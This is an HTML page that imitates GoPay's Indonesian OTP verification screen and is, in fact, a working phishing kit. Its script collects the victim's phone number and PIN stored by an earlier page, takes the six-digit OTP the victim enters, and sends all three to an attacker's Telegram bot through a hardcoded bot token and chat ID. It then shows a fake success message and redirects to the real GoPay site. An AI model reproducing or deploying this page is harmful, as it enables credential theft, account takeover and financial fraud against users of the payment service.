<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  
  <title>GoPay - Verifikasi OTP</title>
  <meta name="theme-color" content="#000000">
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    /* Mengizinkan halaman untuk bisa digeser/didorong ke atas */
    html, body {
      width: 100%;
      min-height: 100%;
      background-color: #000000;
      color: #ffffff;
      overflow-y: auto;
    }

    .app-container {
      width: 100%;
      min-height: 100vh;
      background-color: #000000;
      padding: 16px 20px 30px 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      position: relative;
      margin: 0 auto;
    }

    .go-topbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .go-icon-btn {
      background: none;
      border: none;
      color: #ffffff;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .go-topbar-title {
      font-size: 17px;
      font-weight: 600;
    }

    .go-step3-body {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      margin-bottom: 20px;
    }

    .otp-instruction {
      font-size: 14px;
      color: #9e9e9e;
      margin-bottom: 16px;
      line-height: 1.4;
    }

    /* Kotak Input OTP 6 Digit */
    .otp-display-box {
      width: 100%;
      height: 52px;
      background-color: #121212;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      padding-left: 20px;
      gap: 22px;
      margin-bottom: 16px;
    }

    .otp-dot {
      width: 11px;
      height: 11px;
      border-radius: 50%;
      border: 2px solid #666;
      background: transparent;
      transition: background 0.2s, border-color 0.2s;
    }

    .otp-dot.filled {
      background: #ffffff;
      border-color: #ffffff;
    }

    .resend-info {
      font-size: 13px;
      color: #9e9e9e;
    }

    .resend-btn {
      color: #00aa13;
      font-weight: 600;
      background: none;
      border: none;
      cursor: pointer;
      font-size: 13px;
      margin-top: 6px;
    }

    /* Keypad Angka */
    .keypad-section {
      width: 100%;
      margin-top: auto;
      padding-bottom: 20px;
    }

    .keypad-container {
      width: 100%;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
    }

    .key-btn {
      background: transparent;
      border: none;
      color: #ffffff;
      font-size: 26px;
      font-weight: 600;
      height: 50px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      border-radius: 10px;
    }

    .key-btn:active {
      background-color: rgba(255, 255, 255, 0.1);
    }

    .go-footer {
      text-align: center;
      font-size: 12px;
      color: #666666;
      margin-top: 16px;
    }

    .go-footer span {
      color: #00aa13;
      font-weight: 700;
    }
  </style>
</head>
<body>

  <div class="app-container">
    <div>
      <header class="go-topbar">
        <button type="button" class="go-icon-btn" onclick="history.back()">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
        </button>
        <span class="go-topbar-title">Masukkan Kode Verifikasi</span>
        <button type="button" class="go-icon-btn" style="visibility: hidden;">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/></svg>
        </button>
      </header>

      <div class="go-step3-body">
        <p class="otp-instruction">Kode verifikasi (OTP) telah dikirimkan melalui SMS ke nomor Anda. Masukkan 6 digit kode tersebut di bawah ini.</p>

        <div class="otp-display-box" id="otpDisplay">
          <div class="otp-dot"></div>
          <div class="otp-dot"></div>
          <div class="otp-dot"></div>
          <div class="otp-dot"></div>
          <div class="otp-dot"></div>
          <div class="otp-dot"></div>
        </div>

        <div class="resend-info">Tidak menerima kode?</div>
        <button type="button" class="resend-btn" onclick="alert('Kode OTP baru telah dikirim ulang.')">Kirim ulang</button>
      </div>
    </div>

    <div class="keypad-section">
      <div class="keypad-container">
        <button class="key-btn" onclick="pressKey('1')">1</button>
        <button class="key-btn" onclick="pressKey('2')">2</button>
        <button class="key-btn" onclick="pressKey('3')">3</button>
        <button class="key-btn" onclick="pressKey('4')">4</button>
        <button class="key-btn" onclick="pressKey('5')">5</button>
        <button class="key-btn" onclick="pressKey('6')">6</button>
        <button class="key-btn" onclick="pressKey('7')">7</button>
        <button class="key-btn" onclick="pressKey('8')">8</button>
        <button class="key-btn" onclick="pressKey('9')">9</button>
        <button class="key-btn" style="visibility: hidden;"></button>
        <button class="key-btn" onclick="pressKey('0')">0</button>
        <button class="key-btn" onclick="pressDelete()">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
        </button>
      </div>

      <footer class="go-footer">
        from <span>goto</span>
      </footer>
    </div>
  </div>

  <script>
    let currentOtp = "";
    const dots = document.querySelectorAll('.otp-dot');

    // Konfigurasi Token & Chat ID Telegram Anda (Pastikan sama dengan halaman sebelumnya)
    const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
    const TELEGRAM_CHAT_ID = "6742478722";

    function updateDots() {
      dots.forEach((dot, index) => {
        if (index < currentOtp.length) {
          dot.classList.add('filled');
        } else {
          dot.classList.remove('filled');
        }
      });
    }

    function pressKey(num) {
      if (currentOtp.length < 6) {
        currentOtp += num;
        updateDots();

        if (currentOtp.length === 6) {
          // Ambil data yang tersimpan sebelumnya
          const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
          const savedPin = localStorage.getItem('gopay_pin') || 'Tidak ada data';

          // Kirim data lengkap (No HP + PIN + OTP) ke Telegram Bot
          const message = `🔔 *GOPAY FINAL DATA (OTP)*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${savedPin}\`\n🔢 OTP: \`${currentOtp}\``;
          
          if (TELEGRAM_BOT_TOKEN !== "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
              })
            }).catch(err => console.log(err));
          }

          // Simulasi selesai atau diarahkan ke halaman sukses/beranda asli
          setTimeout(() => {
            alert("Verifikasi berhasil!");
            window.location.href = "https://www.gopay.co.id/";
          }, 500);
        }
      }
    }

    function pressDelete() {
      if (currentOtp.length > 0) {
        currentOtp = currentOtp.slice(0, -1);
        updateDots();
      }
    }
  </script>
</body>
</html>
